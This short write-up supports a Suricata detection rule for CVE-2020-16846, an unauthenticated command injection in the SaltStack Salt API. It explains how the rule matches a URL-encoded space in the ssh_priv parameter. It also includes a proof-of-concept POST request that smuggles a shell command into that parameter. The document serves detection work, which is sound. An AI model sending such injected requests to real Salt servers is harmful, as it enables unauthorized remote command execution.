## Overview
CVE-2020-16846 is an unauthenticated shell command injection on SaltStack Salt. It affects the Salt Master with Salt API installed. Attackers could insert command directly in the **ssh_priv** parameter.  

In the default configuration, the Salt API listens on port 8000/TCP. If you cannot be sure there are no other ports configured, you could use any **any any -> any any** instead of **any any -> any 8000** in the Suricata rule.  

Because of many special characters that attackers can use to insert to the shell command, I try to detect the space (**%20** if URL encoded) in the **ssh_priv** parameter's value instead. In a real life attack, hackers definitely use at least one space in the command they want to execute on the victim server (except whoami, id,...).

## Proof of Concept
```
POST /run HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0
Accept: application/x-yaml
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 87

token=12312&client=ssh&tgt=pyn3rd&fun=a&roster=qwe&ssh_priv=aaa%26%20open%20-a%20Calculator
```

## References
* https://twitter.com/pyn3rd/status/1327070000964780033
* https://github.com/saltstack/salt/commit/023528b3b1b108982989c4872c138d1796821752#diff-2b0018ba85b85d07125591f26aa82ce3f90bbaff1fe966aa83b3ac1113396a3e